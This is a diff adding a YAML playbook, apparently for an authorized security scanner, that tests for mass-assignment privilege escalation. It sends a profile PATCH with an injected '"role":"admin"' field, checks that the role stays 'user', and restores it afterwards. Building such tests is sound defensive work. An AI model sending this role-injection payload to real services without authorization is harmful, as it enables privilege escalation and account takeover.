@@ -1,0 +1,104 @@
+schema_version: 1
+playbook_id: massassignment.role-injection
+version: 1
+title: Mass assignment - privilege escalation via role injection
+description: >-
+  Mass-assignment / auto-binding flaw: a self-service profile update binds an
+  unexpected privileged attribute ("role") straight to the persisted object,
+  letting a normal user escalate to admin. The baseline reads the caller's own
+  role before the update; the scenario then submits a profile patch carrying an
+  injected role and re-reads the role (mutated). The business-logic oracle
+  asserts the role must be unchanged ("user") - any escalation is a finding.
+  Approval-gated (account mutation) - it mutates a privileged attribute and must
+  be pre-authorized by an Engagement Authorization Profile.
+category: authorization
+provenance:
+  source_url: https://github.com/Az0x7/vulnerability-Checklist
+  commit: HEAD
+  adapted_at: 2026-07-22
+  note: >-
+    Idea adapted from the Az0x7 vulnerability checklist (mass assignment /
+    privilege escalation class) to the ARGUS declarative playbook schema.
+cwe:
+  - 915
+  - 269
+wstg:
+  - WSTG-BUSL-01
+owasp_api:
+  - API6:2023
+tags:
+  - authorization
+  - mass-assignment
+  - privilege-escalation
+applies_when:
+  methods:
+    - GET
+    - PATCH
+  path_globs:
+    - /api/*/users/me
+    - /api/*/profile
+  requires_openapi: false
+  input_kinds:
+    - body_json
+required_capabilities:
+  - http_client
+required_principals:
+  - user
+risk_level: high
+requires_approval: true
+preconditions:
+  - kind: principal_available
+    value: user
+steps:
+  - id: read_before
+    action: http_request
+    principal: user
+    save_as: before_resp
+    params:
+      method: GET
+      url: https://target.internal/api/v1/users/me
+      headers: {}
+  - id: mass_assign
+    action: http_request
+    principal: user
+    save_as: assign_resp
+    params:
+      method: PATCH
+      url: https://target.internal/api/v1/users/me
+      headers:
+        Content-Type: application/json
+      body: '{"display_name":"legit-name","role":"admin"}'
+  - id: read_after
+    action: http_request
+    principal: user
+    save_as: after_resp
+    params:
+      method: GET
+      url: https://target.internal/api/v1/users/me
+      headers: {}
+  - id: register_role_cleanup
+    action: register_cleanup
+    params:
+      cleanup_step_id: restore_role
+assertions:
+  - type: business_logic
+    params:
+      field: role
+      relation: equals_expected
+      expected: user
+required_evidence:
+  - baseline_response
+  - mutated_response
+  - normalized_diff
+cleanup:
+  - id: restore_role
+    action: http_request
+    principal: user
+    params:
+      method: PATCH
+      url: https://target.internal/api/v1/users/me
+      headers:
+        Content-Type: application/json
+      body: '{"role":"user"}'
+timeout_seconds: 180
+max_concurrency: 1
